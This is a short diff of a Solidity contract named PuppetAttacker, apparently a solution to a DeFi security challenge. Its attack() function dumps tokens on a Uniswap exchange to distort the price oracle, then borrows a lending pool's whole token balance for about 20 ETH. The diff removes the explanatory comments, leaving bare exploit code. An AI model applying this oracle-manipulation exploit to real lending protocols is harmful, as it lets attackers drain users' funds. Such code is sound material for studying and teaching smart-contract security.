@@ -51,26 +51,12 @@ contract PuppetAttacker {
     }
 
     function attack() external {
-        // Swap the attacker's entire 1000 DVT balance for ETH, creating a very imbalanced ratio in the exchange.
-        // Attacker must transfer DVT tokens from their address to this contract before calling this function.
-        uint256 initialAttackerBalance = token.balanceOf(address(this));
-        token.approve(address(uniswap), initialAttackerBalance);
-        uniswap.tokenToEthSwapInput(
-            initialAttackerBalance,
-            1,
-            block.timestamp + 300
-        );
+        uint256 bal = token.balanceOf(address(this));
+        token.approve(address(uniswap), bal);
+        uniswap.tokenToEthSwapInput(bal, 1, block.timestamp * 2);
 
-        // Since .borrow uses the uniswap exchange as a price oracle, the required collateral is now extremely low
-        // (about 20 ETH for the entire DVT balance). Attacker must send sufficient ETH when deploying this contract.
         uint256 poolBalance = token.balanceOf(address(pool));
-        pool.borrow{value: 20 ether}(poolBalance, attacker); // Any excess ETH sent will be refunded
-
-        // Reverse the initial price manipulation swap to close any arbitrage opportunity.
-        uniswap.ethToTokenSwapInput{value: 1 ether}(1, block.timestamp + 300); // Hardcoded 1 ETH as an example
-
-        // Send all DVT and remaining ETH back to the attacker
-        attacker.transfer(address(this).balance);
+        pool.borrow{value: 20 ether}(poolBalance, attacker);
     }
 
     receive() external payable {}
